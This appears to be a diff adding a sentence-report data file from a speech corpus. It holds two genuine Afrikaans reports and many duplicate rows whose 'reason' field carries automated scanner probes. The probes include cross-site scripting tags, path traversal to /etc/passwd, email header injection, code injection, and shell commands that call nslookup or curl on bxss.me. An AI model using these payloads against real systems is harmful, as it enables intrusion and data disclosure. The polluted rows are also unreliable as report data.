@@ -1,0 +1,74 @@
+sentence_id	sentence	locale	reason
+2af52e8431ccb92ecffb61b0a0a3a6a8b40a5718634cb802118488abf6ef32da	Die potensiële verskil wat deur elektromagnetisme veroorsaak word, wat 'n stroom laat vloei.	af	Die sin, na die komma, maak nie sin nie
+3dd5e15b3f8027e85b74f601e77e8ecbeae94a757a2cbf98637042bdaf872472	Bespreking van die storie en skryfaktiwiteit gebaseer op die agtergrond, karakters en intrige.	af	Sin maak nie sin as ‘n enkeling nie
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	HttP://bxss.me/t/xss.html?%00
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	bxss.me/t/xss.html?%00
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	DB591p3r
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language%0abcc:009247.29801-1459.29801.3e44b.20178.2@bxss.me
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	response.write(9959031*9751800)
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	to@example.com>%0d%0abcc:009247.29801-1460.29801.3e44b.20178.2@bxss.me
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	'+response.write(9959031*9751800)+'
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	"+response.write(9959031*9751800)+"
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	../../../../../../../../../../../../../../etc/passwd
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	../../../../../../../../../../../../../../windows/win.ini
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	file:///etc/passwd
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	../offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	'.gethostbyname(lc('hitjb'.'xveunknm14d7d.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(101).chr(74).chr(110).chr(75).'
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	".gethostbyname(lc("hiteg"."mrjjrnha9ea16.bxss.me."))."A".chr(67).chr(hex("58")).chr(109).chr(80).chr(117).chr(88)."
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	)
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	!(()&&!|*|*|
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	^(#$!@#$)(()))******
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language&n912294=v947417
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	'"()
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	xfs.bxss.me
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language'&&sleep(27*1000)*ylrgqu&&'
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language"&&sleep(27*1000)*haowyf&&"
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language'||sleep(27*1000)*yiwxyw||'
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language"||sleep(27*1000)*rlrfnf||"
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	echo aapnoe$()\ jsddgi\nz^xyu||a #' &echo aapnoe$()\ jsddgi\nz^xyu||a #|" &echo aapnoe$()\ jsddgi\nz^xyu||a #
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	&echo gyqick$()\ agflky\nz^xyu||a #' &echo gyqick$()\ agflky\nz^xyu||a #|" &echo gyqick$()\ agflky\nz^xyu||a #
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	|echo lktfkt$()\ pyatoh\nz^xyu||a #' |echo lktfkt$()\ pyatoh\nz^xyu||a #|" |echo lktfkt$()\ pyatoh\nz^xyu||a #
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	(nslookup -q=cname hitfsmdymwxdj769e9.bxss.me||curl hitfsmdymwxdj769e9.bxss.me))
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	'"
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	1cESyIGYO
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	$(nslookup -q=cname hitlpbjpdkgszb5bcd.bxss.me||curl hitlpbjpdkgszb5bcd.bxss.me)
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	<!--
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	&nslookup -q=cname hitddpromepsu75d51.bxss.me&'\"`0&nslookup -q=cname hitddpromepsu75d51.bxss.me&`'
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	&(nslookup -q=cname hittaycohflvi2e65a.bxss.me||curl hittaycohflvi2e65a.bxss.me)&'\"`0&(nslookup -q=cname hittaycohflvi2e65a.bxss.me||curl hittaycohflvi2e65a.bxss.me)&`'
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	';print(md5(31337));$a='
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	|(nslookup -q=cname hittidbgqlfmdf9b89.bxss.me||curl hittidbgqlfmdf9b89.bxss.me)
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	";print(md5(31337));$a="
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language'"()&%<zzz><ScRiPt >uYUt(9052)</ScRiPt>
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	`(nslookup -q=cname hitcbeaotkdki325c8.bxss.me||curl hitcbeaotkdki325c8.bxss.me)`
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language<esi:include src="http://bxss.me/rpb.png"/>
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	${@print(md5(31337))}
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	'"()&%<zzz><ScRiPt >uYUt(9585)</ScRiPt>
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	;(nslookup -q=cname hitgnyorwivei0feca.bxss.me||curl hitgnyorwivei0feca.bxss.me)|(nslookup -q=cname hitgnyorwivei0feca.bxss.me||curl hitgnyorwivei0feca.bxss.me)&(nslookup -q=cname hitgnyorwivei0feca.bxss.me||curl hitgnyorwivei0feca.bxss.me)
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	${@print(md5(31337))}\
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language9960229
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	'.print(md5(31337)).'
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	${10000318+9999395}
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%00.jpg
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	Http://bxss.me/t/fit.txt
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	http://bxss.me/t/fit.txt%3F.jpg
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	/etc/shells
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	c:/windows/win.ini
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	bxss.me
+00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	bxss.me
